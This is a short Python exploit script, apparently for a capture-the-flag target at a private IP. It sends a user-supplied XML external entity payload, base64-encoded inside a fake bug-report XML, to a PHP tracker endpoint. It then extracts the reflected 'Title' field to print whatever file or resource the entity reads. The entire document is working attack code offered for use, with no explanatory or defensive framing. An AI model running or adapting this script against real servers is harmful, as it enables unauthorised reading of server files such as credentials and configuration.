import requests as req
import base64 as b64
from sys import argv

out_only = False

url = "http://10.10.11.100/tracker_diRbPr00f314.php"

if len(argv) > 1:
    xxe_injection = argv[1]

    if len(argv) > 2 and argv[2] == "--output-only":
        out_only = True

else:
    xxe_injection = input("Insert the XXS Injection payload: ")

payload = {"data":  b64.b64encode(('<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "'+xxe_injection+'"> ]><bugreport><title>&xxe;</title><cwe>1</cwe><cvss>1</cvss><reward>1</reward></bugreport>').encode("UTF-8"))
        }

r = req.post(url, data = payload)

inj_output = r.text.split("<td>Title:</td>\n    <td>")[1].split("</td>")[0]

if not out_only:
    print("XXE INJECTION::\n"+"-"*30)
    print(xxe_injection)
    print("\nOUTPUT:\n"+"-"*30)
print(inj_output)